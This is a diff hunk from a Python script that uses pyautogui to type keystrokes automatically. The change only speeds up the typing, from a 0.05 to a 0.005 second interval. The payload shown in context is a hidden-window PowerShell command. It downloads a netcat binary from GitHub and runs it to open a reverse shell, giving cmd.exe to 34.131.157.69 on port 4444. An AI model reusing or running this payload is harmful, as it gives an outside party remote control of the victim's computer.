@@ -18,5 +18,5 @@ time.sleep(1)
 
 # Step 4: Type the payload
 payload = 'powershell -w Hidden -Command Invoke-WebRequest -Uri https://github.com/err0r-arsenal/netcat/raw/refs/heads/main/ncat.exe -OutFile cat.exe; ./cat.exe 34.131.157.69 4444 -e cmd.exe'
-pyautogui.write(payload, interval=0.05)
+pyautogui.write(payload, interval=0.005)
 pyautogui.press('enter')
